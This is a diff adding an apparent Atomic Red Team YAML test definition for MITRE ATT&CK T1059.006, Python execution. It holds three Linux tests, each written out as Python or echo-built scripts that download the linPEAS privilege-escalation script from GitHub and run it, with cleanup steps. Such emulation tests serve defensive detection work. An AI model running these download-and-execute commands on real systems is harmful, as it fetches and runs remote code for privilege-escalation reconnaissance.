@@ -1,0 +1,147 @@
+attack_technique: T1059.006
+display_name: 'Command and Scripting Interpreter: Python'
+atomic_tests: 
+  - name: Execute shell script via python's command mode arguement
+    auto_generated_guid: 3a95cdb2-c6ea-4761-b24e-02b71889b8bb
+    description: Download and execute shell script and write to file then execute locally using Python -c (command mode)
+    supported_platforms: 
+      - linux
+    input_arguments: 
+      script_url: 
+        description: Shell script public URL
+        type: String
+        default: https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh
+      payload_file_name: 
+        description: Name of shell script downloaded from the script_url
+        type: String
+        default: T1059.006-payload
+      executor: 
+        description: Linux shell
+        type: String
+        default: sh
+      script_args: 
+        description: Arguments to check for system stats, available software, process details, environment paths, open sockets, and interesting files.  
+        type: String
+        default: -q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles
+    dependency_executor_name: sh
+    dependencies: 
+      - description: Verify if python is in the environment variable path and attempt to import requests library.
+        prereq_command: |
+          which_python=`which python`; python -V
+          $which_python -c 'import requests' 2>/dev/null; echo $?
+        get_prereq_command: |
+          pip install requests
+    executor: 
+      command: |
+        $which_python -c 'import requests;import os;url = "#{script_url}";malicious_command = "#{executor} #{payload_file_name} #{script_args}";session = requests.session();source = session.get(url).content;fd = open("#{payload_file_name}", "wb+");fd.write(source);fd.close();os.system(malicious_command)'
+      name: sh
+      cleanup_command: |
+        rm #{payload_file_name}  
+  - name: 'Execute Python via scripts (Linux)'
+    auto_generated_guid: 6c4d1dcb-33c7-4c36-a8df-c6cfd0408be8
+    description: Create Python file (.py) that downloads and executes shell script via executor arguments
+    supported_platforms: 
+      - linux
+    input_arguments: 
+      python_script_name: 
+        description: Python script name
+        type: Path
+        default: T1059.006.py
+      script_url: 
+        description: Shell script public URL
+        type: String
+        default: https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh
+      payload_file_name: 
+        description: Shell script file name downloaded from the script_url
+        type: String
+        default: T1059.006-payload
+      executor: 
+        description: Payload or script interpreter / executor
+        type: String
+        default: sh
+      script_args: 
+        description: Arguments to check for system stats, available software, process details, environment paths, open sockets, and interesting files
+        type: String
+        default: -q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles
+    dependency_executor_name: sh
+    dependencies: 
+      - description: |
+          Requires Python
+        prereq_command: |
+          which_python=`which python`; python -V
+          $which_python -c 'import requests' 2>/dev/null; echo $?
+        get_prereq_command: |
+          pip install requests    
+    executor: 
+      command: |
+        echo 'import requests' > #{python_script_name}
+        echo 'import os' >> #{python_script_name}
+        echo 'url = "#{script_url}"' >> #{python_script_name}
+        echo 'malicious_command = "#{executor} #{payload_file_name} #{script_args}"' >> #{python_script_name}
+        echo 'session = requests.session()' >> #{python_script_name}
+        echo 'source = session.get(url).content' >> #{python_script_name}
+        echo 'fd = open("#{payload_file_name}", "wb+")' >> #{python_script_name}
+        echo 'fd.write(source)' >> #{python_script_name}
+        echo 'fd.close()' >> #{python_script_name}
+        echo 'os.system(malicious_command)' >> #{python_script_name}
+        $which_python #{python_script_name}
+      name: sh
+      cleanup_command: |
+        rm #{python_script_name} #{payload_file_name}  
+  - name: 'Execute Python via Python executables (Linux)'
+    auto_generated_guid: 0b44d79b-570a-4b27-a31f-3bf2156e5eaa
+    description: |
+      Create Python file (.py) then compile to binary (.pyc) that downloads an external malicious script then executes locally using the supplied executor and arguments
+    supported_platforms: 
+      - linux
+    input_arguments: 
+      python_script_name: 
+        description: Name of Python script name
+        type: Path
+        default: T1059.006.py
+      script_url: 
+        description: URL hosting external malicious payload
+        type: String
+        default: https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh
+      payload_file_name: 
+        description: Shell script file name downloaded from the script_url
+        type: String
+        default: T1059.006-payload
+      executor: 
+        description: Payload or script interpreter / executor
+        type: String
+        default: sh
+      script_args: 
+        description: Arguments to check for system stats, available software, process details, environment paths, open sockets, and interesting files
+        type: String
+        default: -q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles
+      python_binary_name: 
+        description: Name of Python file to be compiled
+        type: Path
+        default: T1059.006.pyc
+    dependency_executor_name: sh
+    dependencies: 
+      - description: |
+          Requires Python
+        prereq_command: |
+          which_python=`which python`; python -V
+          $which_python -c 'import requests' 2>/dev/null; echo $?
+        get_prereq_command: |
+          pip install requests    
+    executor: 
+      command: |
+        echo 'import requests' > #{python_script_name}
+        echo 'import os' >> #{python_script_name}
+        echo 'url = "#{script_url}"' >> #{python_script_name}
+        echo 'malicious_command = "#{executor} #{payload_file_name} #{script_args}"' >> #{python_script_name}
+        echo 'session = requests.session()' >> #{python_script_name}
+        echo 'source = session.get(url).content' >> #{python_script_name}
+        echo 'fd = open("#{payload_file_name}", "wb+")' >> #{python_script_name}
+        echo 'fd.write(source)' >> #{python_script_name}
+        echo 'fd.close()' >> #{python_script_name}
+        echo 'os.system(malicious_command)' >> #{python_script_name}
+        $which_python -c 'import py_compile; py_compile.compile("#{python_script_name}", "#{python_binary_name}")'
+        $which_python #{python_binary_name}
+      name: sh
+      cleanup_command: |
+        rm #{python_binary_name} #{python_script_name} #{payload_file_name}
